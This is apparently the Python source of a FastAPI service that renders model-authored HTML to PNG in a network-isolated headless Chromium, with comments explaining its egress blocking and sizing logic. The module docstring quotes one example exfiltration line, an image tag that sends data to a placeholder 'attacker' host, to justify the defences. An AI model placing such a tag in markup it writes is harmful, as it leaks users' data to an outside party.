"""The `htmlrender` sidecar: HTML + CSS in, PNG out. General-purpose, not canvas-specific.

**Why this exists as a service.** Any tool that wants rich visual output — an annotated
photo, a flowchart, a comparison table, a report card — otherwise has to either
hand-roll a rasterizer per shape or send model-authored markup to the owner's browser.
The second is the one `docs/reference/DESIGN.md` refuses: the tool-view registry is
closed and a model may not author markup, URLs, or colour that reaches the DOM.
Rendering server-side to pixels *resolves* that tension rather than dodging it — the
model gets the full expressiveness of a language it is genuinely fluent in, and the
PWA only ever receives an image. Pixels cannot execute.

**The network is off, twice.** The compose service sits on a Docker network declared
`internal: true`, so the container has no route off the box at all, and every request
the page attempts is aborted here as well. Model-authored HTML is untrusted input; a
`<img src="http://attacker/?data=...">` is the obvious exfiltration primitive and
neither layer alone is a guarantee worth betting owner data on.

**It never sees owner images.** Callers render a TRANSPARENT overlay and composite it
over the photograph themselves, back inside the domain firewall. So a health-scoped
photo never leaves the api, and the payload stays small.

**Two rendering modes, because there are two kinds of caller.** The canvas composites
into a rect it already sized, so it sends an explicit `height` and gets exactly that.
A standalone card (`render_html`) does not know how tall its own content is: it omits
`height`, and the page is measured and then CLIPPED to its own content box. Clipping
rather than resizing the viewport is deliberate. Resizing looks like the tidier answer
— lay out at the final height so `vh` resolves against the box that ships — but it does
not converge: a `height:50vh` block halves on every pass, so the shot ends up taller
than the content and leaves a band of empty ground, which is the exact second-frame
failure this mode exists to prevent. A clip cannot leave a band: the captured region IS
the measured content box. The cost is that `vh` and `window.innerHeight` resolve against
a fixed probe viewport, which is a poor unit for a content-sized card anyway.

Lazy-launches the browser on first call and idle-unloads it, the same shape as the
`rapidocr` sidecar, so an idle box pays only the process baseline.
"""

from __future__ import annotations

import asyncio
import base64
import os
import struct
import time

from fastapi import FastAPI, HTTPException
from playwright.async_api import Browser, async_playwright
from pydantic import BaseModel, Field

# Free the browser after this many idle seconds (0 keeps it resident once launched).
IDLE_TTL_SECONDS = int(os.environ.get("HTMLRENDER_IDLE_TTL_SECONDS", "300"))

# Bound the output so a caller can't ask for a gigapixel page. Both bounds are on the
# OUTPUT (after `scale`), not the CSS viewport: a 4096px viewport at scale 4 is a
# 16384px image, and it is the image that has to be encoded, shipped and decoded.
MAX_SIDE = 4096
MAX_PIXELS = 8_000_000
MAX_HTML_BYTES = 512_000
RENDER_TIMEOUT_MS = 15_000

# The layout viewport a measured render lays out in. The capture is clipped to the
# content rather than to this, so it does not bound how tall a card may be — but it IS
# what `vh` and `window.innerHeight` resolve against on a page with no height of its own.
PROBE_HEIGHT = 800

# How tall the content is, in CSS pixels. NOT `documentElement.scrollHeight`: that floors
# at the viewport, so every short card measured as exactly PROBE_HEIGHT and came back
# padded with empty ground — the second-frame bug this mode exists to remove. The body's
# own border box is the real answer (`flow-root` + the page gutter mean it includes the
# margins and padding); `scrollHeight` covers a child that overflows it; and the
# documentElement term is admitted only when the page genuinely overflows the viewport,
# which is the one case where its floor is not a lie.
_MEASURE = """(() => {
  const b = document.body, r = b.getBoundingClientRect();
  const overflowed = document.documentElement.scrollHeight > window.innerHeight
    ? document.documentElement.scrollHeight : 0;
  return Math.ceil(Math.max(b.scrollHeight, r.height, overflowed));
})()"""

# Opaque page grounds, keyed by a NAME rather than taking a colour string: nothing a caller
# sends is interpolated into our stylesheet, and each ground comes paired with an ink that
# has real contrast against it (the render is read by a VISION MODEL as well as by the
# owner). The values are the PWA's own `--surface` / `--text` tokens
# (frontend/src/styles/tokens.css, the binding tables in docs/reference/DESIGN.md), and
# matching them EXACTLY is the point: the app frames the image on `--surface`, so a ground
# merely close to it reads as a second rectangle inside the card.
THEMES = {
    "light": ("#ffffff", "#1a1b1e"),
    "dark": ("#17181b", "#e6e7e9"),
}
DEFAULT_THEME = "dark"

app = FastAPI()

_browser: Browser | None = None
_playwright = None
_last_used = 0.0
_lock = asyncio.Lock()


class RenderRequest(BaseModel):
    html: str = Field(min_length=1)
    width: int = Field(ge=1, le=MAX_SIDE)
    # None means MEASURE: lay the page out, take its content height, and shoot that.
    # An explicit height is honoured exactly (the canvas composites into a known rect).
    height: int | None = Field(default=None, ge=1, le=MAX_SIDE)
    # Transparent is the default because the primary caller composites over a photo
    # it must not send here.
    transparent: bool = True
    # Page ground + default text colour for an opaque render. Ignored when transparent.
    theme: str = DEFAULT_THEME
    # A gutter the PAGE owns, in CSS px. Given to the wrapper rather than left to the
    # caller's markup so a card does not need an outer padded <div> — that wrapper is
    # how model-authored markup grows a second visible edge inside the app's card.
    pad: int = Field(default=0, ge=0, le=256)
    # Extra settling time for webfont-free layout/animation. Bounded; the page has no
    # network, so nothing legitimate needs to be waited on for long.
    wait_ms: int = Field(default=0, ge=0, le=3000)
    scale: float = Field(default=1.0, gt=0, le=4.0)


class RenderResponse(BaseModel):
    png_base64: str
    # The image's REAL dimensions, read back out of the PNG header rather than computed
    # from the request. A caller that sizes a frame from these (the PWA card sets its
    # aspect-ratio from them) crops the image if they disagree by even a pixel.
    width: int
    height: int
    # True when the content was taller than the caps allowed and the page was cut off.
    # Reported rather than swallowed: a silently half-rendered table is the kind of
    # thing that gets discovered from a wrong answer.
    clipped: bool = False


async def _get_browser() -> Browser:
    global _browser, _playwright, _last_used
    async with _lock:
        if _browser is None:
            _playwright = await async_playwright().start()
            _browser = await _playwright.chromium.launch(
                args=[
                    "--no-sandbox",  # the container is the sandbox; Chromium's needs CAP_SYS_ADMIN
                    "--disable-dev-shm-usage",
                    "--disable-gpu",
                    "--disable-extensions",
                    "--disable-background-networking",
                    "--no-first-run",
                ]
            )
        _last_used = time.monotonic()
        return _browser


async def _idle_reaper() -> None:
    global _browser, _playwright
    if IDLE_TTL_SECONDS <= 0:
        return
    while True:
        await asyncio.sleep(30)
        async with _lock:
            idle = time.monotonic() - _last_used
            if _browser is not None and idle > IDLE_TTL_SECONDS:
                await _browser.close()
                _browser = None
                if _playwright is not None:
                    await _playwright.stop()
                    _playwright = None


@app.on_event("startup")
async def _startup() -> None:
    asyncio.create_task(_idle_reaper())


@app.get("/healthz")
async def healthz() -> dict[str, object]:
    return {"ok": True, "browser_loaded": _browser is not None}


def _max_css_height(width: int, scale: float) -> int:
    """The tallest CSS height whose OUTPUT still fits both caps at this width/scale."""
    out_width = max(1, round(width * scale))
    by_side = MAX_SIDE
    by_area = MAX_PIXELS // max(1, out_width)
    return max(1, int(min(by_side, by_area) / scale))


def _png_size(png: bytes) -> tuple[int, int]:
    """(width, height) from the PNG IHDR — the image's own account of itself."""
    width, height = struct.unpack(">II", png[16:24])
    return int(width), int(height)


@app.post("/render")
async def render(body: RenderRequest) -> RenderResponse:
    if len(body.html.encode("utf-8")) > MAX_HTML_BYTES:
        raise HTTPException(status_code=413, detail="html too large")
    ceiling = _max_css_height(body.width, body.scale)
    if max(1, round(body.width * body.scale)) > MAX_SIDE:
        raise HTTPException(status_code=413, detail="requested page is too wide to render")
    if body.height is not None and body.height > ceiling:
        raise HTTPException(status_code=413, detail="requested page is too many pixels")
    browser = await _get_browser()
    context = await browser.new_context(
        viewport={"width": body.width, "height": body.height or PROBE_HEIGHT},
        device_scale_factor=body.scale,
        # No JS-visible locale/timezone leakage, and a fixed one keeps renders
        # reproducible across restarts.
        locale="en-US",
        timezone_id="UTC",
    )
    clipped = False
    try:
        page = await context.new_page()

        async def _block(route: object) -> None:
            # The container has no egress anyway; this is the second lock, and it also
            # stops a page hanging on a request that would otherwise time out slowly.
            url = route.request.url  # type: ignore[attr-defined]
            if url.startswith(("data:", "blob:", "about:")):
                await route.continue_()  # type: ignore[attr-defined]
            else:
                await route.abort()  # type: ignore[attr-defined]

        await page.route("**/*", _block)
        await page.set_content(_document(body), wait_until="load", timeout=RENDER_TIMEOUT_MS)
        if body.wait_ms:
            await page.wait_for_timeout(body.wait_ms)
        shot: dict = {}
        if body.height is None:
            measured = int(await page.evaluate(_MEASURE))
            height = max(1, min(measured, ceiling))
            clipped = measured > height
            # `full_page` so the clip may reach past the probe viewport for a long card;
            # the clip is what guarantees the image ends where the content does.
            shot = {
                "full_page": True,
                "clip": {"x": 0, "y": 0, "width": body.width, "height": height},
            }
        png = await page.screenshot(
            omit_background=body.transparent, type="png", timeout=RENDER_TIMEOUT_MS, **shot
        )
    except Exception as exc:  # noqa: BLE001 - a bad page must be a 400, never a 500
        raise HTTPException(status_code=400, detail=f"render failed: {exc}") from exc
    finally:
        await context.close()
    width, height = _png_size(png)
    return RenderResponse(
        png_base64=base64.b64encode(png).decode("ascii"),
        width=width,
        height=height,
        clipped=clipped,
    )


def _document(body: RenderRequest) -> str:
    """Wrap the caller's fragment in a page with a known baseline.

    The reset matters for the overlay case: a default 8px body margin would shift
    every absolutely-positioned annotation by 8px against coordinates the caller
    computed from the photograph.

    The ground is painted on `html` as well as `body` so an opaque render is full-bleed
    to the edges. That is deliberate: the app frames the returned image in its own card,
    so any inset ground the page left showing would read as a frame inside a frame."""
    ground, ink = THEMES.get(body.theme, THEMES[DEFAULT_THEME])
    if body.transparent:
        ground = "transparent"
    # An explicit height pins the page to it; a measured render must be free to grow.
    # `flow-root` only in the measured case: it stops a first child's margin collapsing
    # out through body (which would clip the top off the shot), and confining it to this
    # branch leaves the canvas's fixed-size blocks laying out exactly as they always have.
    box = f"height: {body.height}px;" if body.height is not None else "display: flow-root;"
    # Only an opaque render pins a text colour. A transparent overlay keeps the browser
    # default, so the canvas's html blocks composite exactly as they always have.
    colour = f"color: {ink};" if not body.transparent else ""
    return f"""<!doctype html>
<html><head><meta charset="utf-8"><style>
  *, *::before, *::after {{ box-sizing: border-box; }}
  html, body {{ margin: 0; padding: 0; width: {body.width}px; background: {ground}; }}
  body {{ padding: {body.pad}px; {box} {colour}
          font-family: system-ui, -apple-system, "Segoe UI", Roboto,
          "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif,
          "Noto Color Emoji"; }}
</style></head><body>{body.html}</body></html>"""
